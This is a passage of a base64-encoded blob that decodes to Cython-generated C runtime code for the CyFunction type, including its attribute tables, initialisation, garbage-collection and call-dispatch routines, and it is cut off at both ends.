m9vbF9Gcm9tTG9uZyhpc19jb3JvdXRpbmUpO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKG9wLT5mdW5jX2lzX2Nvcm91dGluZSkge1xuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKG9wLT5mdW5jX2lzX2Nvcm91dGluZSk7XG4gICAgfVxuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZV92YWx1ZShvcCk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBpZiAob3AtPmZ1bmNfaXNfY29yb3V0aW5lKSB7XG4gICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpO1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBvcC0+ZnVuY19pc19jb3JvdXRpbmUgPSBfX1B5eF9OZXdSZWYocmVzdWx0KTtcbiAgICB9XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV9hcmd1bWVudF9jb3VudF9lcnJvcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpmdW5jLCBjb25zdCBjaGFyKiBtZXNzYWdlLCBQeV9zc2l6ZV90IHNpemUpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKnB5X25hbWUgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lKGZ1bmMsIE5VTEwpO1xuICAgIGlmICghcHlfbmFtZSkgcmV0dXJuO1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICIlLjIwMFMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsXG4gICAgICAgIHB5X25hbWUsIG1lc3NhZ2UsIHNpemUpO1xuICAgIFB5X0RFQ1JFRihweV9uYW1lKTtcbiNlbHNlXG4gICAgY29uc3QgY2hhciogbmFtZSA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5tX21sLT5tbF9uYW1lO1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICIlLjIwMHMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsXG4gICAgICAgIG5hbWUsIG1lc3NhZ2UsIHNpemUpO1xuI2VuZGlmXG59XG5zdGF0aWMgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqZnVuYywgY29uc3QgY2hhciogbWVzc2FnZSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqcHlfbmFtZSA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoZnVuYywgTlVMTCk7XG4gICAgaWYgKCFweV9uYW1lKSByZXR1cm47XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiUuMjAwUygpICVzIixcbiAgICAgICAgcHlfbmFtZSwgbWVzc2FnZSk7XG4gICAgUHlfREVDUkVGKHB5X25hbWUpO1xuI2Vsc2VcbiAgICBjb25zdCBjaGFyKiBuYW1lID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fbWwtPm1sX25hbWU7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiUuMjAwcygpICVzIixcbiAgICAgICAgbmFtZSwgbWVzc2FnZSk7XG4jZW5kaWZcbn1cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfbW9kdWxlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgcmV0dXJuIFB5T2JqZWN0X0dldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX21vZHVsZV9fIik7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9tb2R1bGUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIHJldHVybiBQeU9iamVjdF9TZXRBdHRyU3RyaW5nKG9wLT5mdW5jLCAiX19tb2R1bGVfXyIsIHZhbHVlKTtcbn1cbiNlbmRpZlxuc3RhdGljIFB5R2V0U2V0RGVmIF9fcHl4X0N5RnVuY3Rpb25fZ2V0c2V0c1tdID0ge1xuICAgIHsiZnVuY19kb2MiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MsIDAsIDB9LFxuICAgIHsiX19kb2NfXyIsICAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MsIDAsIDB9LFxuICAgIHsiZnVuY19uYW1lIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X25hbWUsIDAsIDB9LFxuICAgIHsiX19uYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZSwgMCwgMH0sXG4gICAgeyJfX3F1YWxuYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X3F1YWxuYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X3F1YWxuYW1lLCAwLCAwfSxcbiAgICB7ImZ1bmNfZGljdCIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdCwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kaWN0LCAwLCAwfSxcbiAgICB7Il9fZGljdF9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0LCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RpY3QsIDAsIDB9LFxuICAgIHsiZnVuY19nbG9iYWxzIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzLCAwLCAwLCAwfSxcbiAgICB7Il9fZ2xvYmFsc19fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzLCAwLCAwLCAwfSxcbiAgICB7ImZ1bmNfY2xvc3VyZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY2xvc3VyZSwgMCwgMCwgMH0sXG4gICAgeyJfX2Nsb3N1cmVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY2xvc3VyZSwgMCwgMCwgMH0sXG4gICAgeyJmdW5jX2NvZGUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2NvZGUsIDAsIDAsIDB9LFxuICAgIHsiX19jb2RlX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2NvZGUsIDAsIDAsIDB9LFxuICAgIHsiZnVuY19kZWZhdWx0cyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGVmYXVsdHMsIDAsIDB9LFxuICAgIHsiX19kZWZhdWx0c19fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0cywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kZWZhdWx0cywgMCwgMH0sXG4gICAgeyJfX2t3ZGVmYXVsdHNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfa3dkZWZhdWx0cywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9rd2RlZmF1bHRzLCAwLCAwfSxcbiAgICB7Il9fYW5ub3RhdGlvbnNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMsIDAsIDB9LFxuICAgIHsiX2lzX2Nvcm91dGluZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lLCAwLCAwLCAwfSxcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgeyJfX21vZHVsZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9tb2R1bGUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbW9kdWxlLCAwLCAwfSxcbiNlbmRpZlxuICAgIHswLCAwLCAwLCAwLCAwfVxufTtcbnN0YXRpYyBQeU1lbWJlckRlZiBfX3B5eF9DeUZ1bmN0aW9uX21lbWJlcnNbXSA9IHtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHsiX19tb2R1bGVfXyIsIFRfT0JKRUNULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV9tb2R1bGUpLCAwLCAwfSxcbiNlbmRpZlxuICAgIHsiX19kaWN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX2RpY3QpLCBSRUFET05MWSwgMH0sXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgeyJfX3ZlY3RvcmNhbGxvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QsIGZ1bmNfdmVjdG9yY2FsbCksIFJFQURPTkxZLCAwfSxcbiNlbHNlXG4gICAgeyJfX3ZlY3RvcmNhbGxvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKFB5Q0Z1bmN0aW9uT2JqZWN0LCB2ZWN0b3JjYWxsKSwgUkVBRE9OTFksIDB9LFxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHsiX193ZWFrbGlzdG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgZnVuY193ZWFrcmVmbGlzdCksIFJFQURPTkxZLCAwfSxcbiNlbHNlXG4gICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV93ZWFrcmVmbGlzdCksIFJFQURPTkxZLCAwfSxcbiNlbmRpZlxuI2VuZGlmXG4gICAgezAsIDAsIDAsICAwLCAwfVxufTtcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX3JlZHVjZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCBQeU9iamVjdCAqYXJncylcbntcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihhcmdzKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG0pO1xuICAgIFB5X0lOQ1JFRihtLT5mdW5jX3F1YWxuYW1lKTtcbiAgICByZXN1bHQgPSBtLT5mdW5jX3F1YWxuYW1lO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9DeUZ1bmN0aW9uX21ldGhvZHNbXSA9IHtcbiAgICB7Il9fcmVkdWNlX18iLCAoUHlDRnVuY3Rpb24pX19QeXhfQ3lGdW5jdGlvbl9yZWR1Y2UsIE1FVEhfVkFSQVJHUywgMH0sXG4gICAgezAsIDAsIDAsIDB9XG59O1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChjeWZ1bmMpICgoY3lmdW5jKS0+ZnVuY193ZWFrcmVmbGlzdClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fd2Vha3JlZmxpc3QoY3lmdW5jKSAoKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV93ZWFrcmVmbGlzdClcbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5TWV0aG9kRGVmICptbCwgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QqIGdsb2JhbHMsIFB5T2JqZWN0KiBjb2RlKSB7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeUNGdW5jdGlvbk9iamVjdCAqY2YgPSAoUHlDRnVuY3Rpb25PYmplY3QqKSBvcDtcbiNlbmRpZlxuICAgIGlmICh1bmxpa2VseShvcCA9PSBOVUxMKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIG9wLT5mdW5jID0gUHlDRnVuY3Rpb25fTmV3RXgobWwsIChQeU9iamVjdCopb3AsIG1vZHVsZSk7XG4gICAgaWYgKHVubGlrZWx5KCFvcC0+ZnVuYykpIHJldHVybiBOVUxMO1xuI2VuZGlmXG4gICAgb3AtPmZsYWdzID0gZmxhZ3M7XG4gICAgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChvcCkgPSBOVUxMO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgY2YtPm1fbWwgPSBtbDtcbiAgICBjZi0+bV9zZWxmID0gKFB5T2JqZWN0ICopIG9wO1xuI2VuZGlmXG4gICAgUHlfWElOQ1JFRihjbG9zdXJlKTtcbiAgICBvcC0+ZnVuY19jbG9zdXJlID0gY2xvc3VyZTtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X1hJTkNSRUYobW9kdWxlKTtcbiAgICBjZi0+bV9tb2R1bGUgPSBtb2R1bGU7XG4jZW5kaWZcbiAgICBvcC0+ZnVuY19kaWN0ID0gTlVMTDtcbiAgICBvcC0+ZnVuY19uYW1lID0gTlVMTDtcbiAgICBQeV9JTkNSRUYocXVhbG5hbWUpO1xuICAgIG9wLT5mdW5jX3F1YWxuYW1lID0gcXVhbG5hbWU7XG4gICAgb3AtPmZ1bmNfZG9jID0gTlVMTDtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIG9wLT5mdW5jX2NsYXNzb2JqID0gTlVMTDtcbiNlbHNlXG4gICAgKChQeUNNZXRob2RPYmplY3QqKW9wKS0+bW1fY2xhc3MgPSBOVUxMO1xuI2VuZGlmXG4gICAgb3AtPmZ1bmNfZ2xvYmFscyA9IGdsb2JhbHM7XG4gICAgUHlfSU5DUkVGKG9wLT5mdW5jX2dsb2JhbHMpO1xuICAgIFB5X1hJTkNSRUYoY29kZSk7XG4gICAgb3AtPmZ1bmNfY29kZSA9IGNvZGU7XG4gICAgb3AtPmRlZmF1bHRzID0gTlVMTDtcbiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBOVUxMO1xuICAgIG9wLT5kZWZhdWx0c19rd2RpY3QgPSBOVUxMO1xuICAgIG9wLT5kZWZhdWx0c19nZXR0ZXIgPSBOVUxMO1xuICAgIG9wLT5mdW5jX2Fubm90YXRpb25zID0gTlVMTDtcbiAgICBvcC0+ZnVuY19pc19jb3JvdXRpbmUgPSBOVUxMO1xuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICAgc3dpdGNoIChtbC0+bWxfZmxhZ3MgJiAoTUVUSF9WQVJBUkdTIHwgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfTk9BUkdTIHwgTUVUSF9PIHwgTUVUSF9LRVlXT1JEUyB8IE1FVEhfTUVUSE9EKSkge1xuICAgIGNhc2UgTUVUSF9OT0FSR1M6XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1M7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgTUVUSF9POlxuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTztcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSBNRVRIX01FVEhPRCB8IE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTOlxuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFNfTUVUSE9EO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTOlxuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFM7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgTUVUSF9WQVJBUkdTIHwgTUVUSF9LRVlXT1JEUzpcbiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gTlVMTDtcbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1N5c3RlbUVycm9yLCAiQmFkIGNhbGwgZmxhZ3MgZm9yIEN5RnVuY3Rpb24iKTtcbiAgICAgICAgUHlfREVDUkVGKG9wKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBvcDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fY2xlYXIoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSlcbntcbiAgICBQeV9DTEVBUihtLT5mdW5jX2Nsb3N1cmUpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9DTEVBUihtLT5mdW5jKTtcbiNlbHNlXG4gICAgUHlfQ0xFQVIoKChQeUNGdW5jdGlvbk9iamVjdCopbSktPm1fbW9kdWxlKTtcbiNlbmRpZlxuICAgIFB5X0NMRUFSKG0tPmZ1bmNfZGljdCk7XG4gICAgUHlfQ0xFQVIobS0+ZnVuY19uYW1lKTtcbiAgICBQeV9DTEVBUihtLT5mdW5jX3F1YWxuYW1lKTtcbiAgICBQeV9DTEVBUihtLT5mdW5jX2RvYyk7XG4gICAgUHlfQ0xFQVIobS0+ZnVuY19nbG9iYWxzKTtcbiAgICBQeV9DTEVBUihtLT5mdW5jX2NvZGUpO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxXG4gICAgUHlfQ0xFQVIoX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihtKSk7XG4jZWxzZVxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKmNscyA9IChQeU9iamVjdCopICgoUHlDTWV0aG9kT2JqZWN0ICopIChtKSktPm1tX2NsYXNzO1xuICAgICAgICAoKFB5Q01ldGhvZE9iamVjdCAqKSAobSkpLT5tbV9jbGFzcyA9IE5VTEw7XG4gICAgICAgIFB5X1hERUNSRUYoY2xzKTtcbiAgICB9XG4jZW5kaWZcbiNlbmRpZlxuICAgIFB5X0NMRUFSKG0tPmRlZmF1bHRzX3R1cGxlKTtcbiAgICBQeV9DTEVBUihtLT5kZWZhdWx0c19rd2RpY3QpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfYW5ub3RhdGlvbnMpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfaXNfY29yb3V0aW5lKTtcbiAgICBQeV9DTEVBUihtLT5kZWZhdWx0cyk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pXG57XG4gICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fd2Vha3JlZmxpc3QobSkgIT0gTlVMTClcbiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcygoUHlPYmplY3QgKikgbSk7XG4gICAgX19QeXhfQ3lGdW5jdGlvbl9jbGVhcihtKTtcbiAgICBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChtKTtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fZGVhbGxvYyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptKVxue1xuICAgIFB5T2JqZWN0X0dDX1VuVHJhY2sobSk7XG4gICAgX19QeXhfX0N5RnVuY3Rpb25fZGVhbGxvYyhtKTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfQ3lGdW5jdGlvbl90cmF2ZXJzZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZylcbntcbiAgICB7XG4gICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopbSwgMSwgdmlzaXQsIGFyZyk7XG4gICAgICAgIGlmIChlKSByZXR1cm4gZTtcbiAgICB9XG4gICAgUHlfVklTSVQobS0+ZnVuY19jbG9zdXJlKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfVklTSVQobS0+ZnVuYyk7XG4jZWxzZVxuICAgIFB5X1ZJU0lUKCgoUHlDRnVuY3Rpb25PYmplY3QqKW0pLT5tX21vZHVsZSk7XG4jZW5kaWZcbiAgICBQeV9WSVNJVChtLT5mdW5jX2RpY3QpO1xuICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bmNfbmFtZSk7XG4gICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19xdWFsbmFtZSk7XG4gICAgUHlfVklTSVQobS0+ZnVuY19kb2MpO1xuICAgIFB5X1ZJU0lUKG0tPmZ1bmNfZ2xvYmFscyk7XG4gICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19jb2RlKTtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X1ZJU0lUKF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmoobSkpO1xuI2VuZGlmXG4gICAgUHlfVklTSVQobS0+ZGVmYXVsdHNfdHVwbGUpO1xuICAgIFB5X1ZJU0lUKG0tPmRlZmF1bHRzX2t3ZGljdCk7XG4gICAgUHlfVklTSVQobS0+ZnVuY19pc19jb3JvdXRpbmUpO1xuICAgIFB5X1ZJU0lUKG0tPmRlZmF1bHRzKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCpcbl9fUHl4X0N5RnVuY3Rpb25fcmVwcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcClcbntcbiAgICBQeU9iamVjdCAqcmVwcjtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXByID0gUHlVbmljb2RlX0Zyb21Gb3JtYXQoIjxjeWZ1bmN0aW9uICVVIGF0ICVwPiIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wLT5mdW5jX3F1YWxuYW1lLCAodm9pZCAqKW9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXByO1xufVxuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9DYWxsTWV0aG9kKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0ICpmID0gKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYztcbiAgICBQeUNGdW5jdGlvbiBtZXRoO1xuICAgIGludCBmbGFncztcbiAgICBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZik7XG4gICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7XG4gICAgZmxhZ3MgPSBQeUNGdW5jdGlvbl9HZXRGbGFncyhmKTtcbiAgICBpZiAodW5saWtlbHkoZmxhZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIFB5Q0Z1bmN0aW9uT2JqZWN0KiBmID0gKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jO1xuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBmLT5tX21sLT5tbF9tZXRoO1xuICAgIGludCBmbGFncyA9IGYtPm1fbWwtPm1sX2ZsYWdzO1xuI2VuZGlmXG4gICAgUHlfc3NpemVfdCBzaXplO1xuICAgIHN3aXRjaCAoZmxhZ3MgJiAoTUVUSF9WQVJBUkdTIHwgTUVUSF9LRVlXT1JEUyB8IE1FVEhfTk9BUkdTIHwgTUVUSF9PKSkge1xuICAgIGNhc2UgTUVUSF9WQVJBUkdTOlxuICAgICAgICBpZiAobGlrZWx5KGt3ID09IE5VTEwgfHwgUHlEaWN0X1NpemUoa3cpID09IDApKVxuICAgICAgICAgICAgcmV0dXJuICgqbWV0aCkoc2VsZiwgYXJnKTtcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTOlxuICAgICAgICByZXR1cm4gKCooUHlDRnVuY3Rpb25XaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgYXJnLCBrdyk7XG4gICAgY2FzZSBNRVRIX05PQVJHUzpcbiAgICAgICAgaWYgKGxpa2VseShrdyA9PSBOVUxMIHx8IFB5RGljdF9TaXplKGt3KSA9PSAwKSkge1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgICAgICBzaXplID0gUHlUdXBsZV9HRVRfU0laRShhcmcpO1xuI2Vsc2VcbiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX1NpemUoYXJnKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplIDwgMCkpIHJldHVybiBOVUxMO1xuI2VuZGlmXG4gICAgICAgICAgICBpZiAobGlrZWx5KHNpemUgPT0gMCkpXG4gICAgICAgICAgICAgICAgcmV0dXJuICgqbWV0aCkoc2VsZiwgTlVMTCk7XG4gICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9u